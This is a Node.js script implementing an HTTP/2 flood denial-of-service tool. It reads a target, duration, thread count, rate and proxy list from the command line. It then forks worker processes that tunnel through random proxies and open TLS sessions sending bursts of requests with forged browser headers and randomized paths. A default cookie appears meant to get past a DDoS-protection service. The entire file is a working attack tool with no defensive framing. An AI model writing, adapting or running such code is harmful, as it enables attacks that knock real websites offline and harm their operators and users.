const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const { HeaderGenerator } = require('header-generator');
process.on('uncaughtException',  function(error) {});
process.on('unhandledRejection', function(error) {});


const args = { 
	target: process.argv[2],
	time: process.argv[3],
	threads: process.argv[4],
	ratelimit: process.argv[5],
	method: process.argv[6],
	proxyfile: process.argv[7],
	cookie: process.argv[8],
}

if(args.cookie == undefined) { args.cookie = 'ventryshield_pre=55.7483037.6171010506613335' }

const proxies = fs.readFileSync(args.proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const target = args.target;
let errors = 0;

function rnd_string(length, type) 
{
	var _ = "";
	var characters = "";
	if (type == "LN") 
	{
		characters ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	} 
	else if (type == "L") 
	{
		characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	} 
	else if (type == "N")
	{
		characters = "0123456789";
	} 
	else 
	{
	characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	}

	var charactersLength = characters.length;

	for (var i = 0; i < length; i++) 
	{
		_ += characters.charAt(Math.floor(Math.random() * charactersLength));
	}

	return _;
}

function parseRandTarget(target) {
	if (target.includes("%RAND%")) 
	{
		target = target.replace(/%RAND%/g, rnd_string(8, "LN"));
	} 
	else if (target.includes("%RANDLN8%")) 
	{
		target = target.replace(/%RANDLN8%/g, rnd_string(8, "LN"));
	} 
	else if (target.includes("%RANDLN16%")) 
	{
		target = target.replace(/%RANDLN16%/g, rnd_string(16, "LN"));
	} 
	else if (target.includes("%RANDLN32%")) 
	{
		target = target.replace(/%RANDLN32%/g, rnd_string(32, "LN"));
	} 
	else if (target.includes("%RANDLN64%")) 
	{
		target = target.replace(/%RANDLN64%/g, rnd_string(64, "LN"));
	} 
	else if (target.includes("%RANDL%")) 
	{
		target = target.replace(/%RANDL%/g, rnd_string(8, "L"));
	} 
	else if (target.includes("%RANDL16%")) 
	{
		target = target.replace(/%RANDL16%/g, rnd_string(16, "L"));
	} 
	else if (target.includes("%RANDL32%")) 
	{
		target = target.replace(/%RANDL32%/g, rnd_string(32, "L"));
	} 
	else if (target.includes("%RANDL64%")) 
	{
		target = target.replace(/%RANDL64%/g, rnd_string(64, "L"));
	} 
	else if (target.includes("%RANDN%")) 
	{
		target = target.replace(/%RANDN%/g, rnd_string(8, "N"));
	} 
	else if (target.includes("%RANDN16%")) 
	{
		target = target.replace(/%RANDN16%/g, rnd_string(16, "N"));
	} 
	else if (target.includes("%RANDN32%")) 
	{
		target = target.replace(/%RANDN32%/g, rnd_string(32, "N"));
	} 
	else if (target.includes("%RANDN64%")) 
	 {
		target = target.replace(/%RANDN64%/g, rnd_string(64, "N"));
	} 
	else 
	{
		target = target;
	}
	return target;
}	
	let headerGenerator = new HeaderGenerator({
		browsers: [
			{name: "chrome", minVersion: 100, httpVersion: "2"},
			{name: "firefox", minVersion: 100, httpVersion: "2"},
			{name: "safari", httpVersion: "2"},
		],
		devices: [
			"desktop",
			"mobile"
		],
		operatingSystems: [
			"linux",
			"windows",
			"macos",
			"android",
			"ios"
		],
		locales: ["en-US", "en"]
	});
	
	let randomHeaders = headerGenerator.getHeaders();
	let headers = randomHeaders;
let parsed = url.parse(target);

function main() {	
	let userAgents = [
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/110.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/109.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/108.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/107.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/106.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/105.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/104.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/103.0.10848.49 Safari/770.46',
		'4kJxWJ9E5q/5.0 (KGqzi8kX52 lseXcJmAcd) AppleWebKit/535.46 (KHTML, like Gecko) NemTGV4gXX/102.0.10848.49 Safari/770.46',
	]
	
	

	function flood() {
		var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(':');	

		const agent = new http.Agent({
		   keepAlive: true,
		   keepAliveMsecs: 50000,
		   maxSockets: Infinity,
		   maxTotalSockets: Infinity,
		   maxSockets: Infinity
		});	

		
		const req = http.request({
			  method: 'CONNECT',
			  host: proxy[0],
			  port: proxy[1],
			  agent: agent,
			  globalAgent: agent,		  
			  path: parsed.host + ":443",
			  headers: {
				  'Host': parsed.host,
				  'Proxy-Connection': 'Keep-Alive',
				  'Connection': 'Keep-Alive',
			  },		  
		});
  
		req.on('connect', (err, info) => {		
			function attack(socket) {
				http2.connect(parseRandTarget(target), {
					createConnection: () => socket,
					settings: {
						headerTableSize: 65536,
						maxConcurrentStreams: 1000,
						initialWindowSize: 6291456,
						maxHeaderListSize: 262144,
						enablePush: false
					}
				}, (session) => {				
					for(let i = 0; i < args.ratelimit; i++) {
						if (i >= args.ratelimit) {
							return;
						}								
						const request = session.request(headers);
						request.setEncoding('utf8');
						request.on('data', (chunk) => {});
						request.on("response", () => {
							request.close();
						})
						request.end();
					}
				}).on('error', () => {
					errors++
					if(errors > 5) { return }
				})
			}
			
			const socket = tls.connect({
			  rejectUnauthorized: false,
			  host: parsed.host + ":443",
			  servername: parsed.host,
			  secureOptions: crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE,
			  ciphers: 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
			  honorCipherOrder: false, 
			  requestCert: true,
			  socket: info,
			  secure: true,
			  ALPNProtocols: ['h2','http1.1'],
			}, () => {
			  attack(socket);		
			})
		})
		req.end();
	}
	flood();
}

if (cluster.isPrimary) {
	for (let i = 0; i < args.threads; i++) {
		cluster.fork();
	}
	cluster.on('exit', (worker, code, signal) => {});
} else {

	setInterval(main)
	setTimeout(function() {
		console.clear();
		process.exit(-1)
	}, args.time * 1000);
}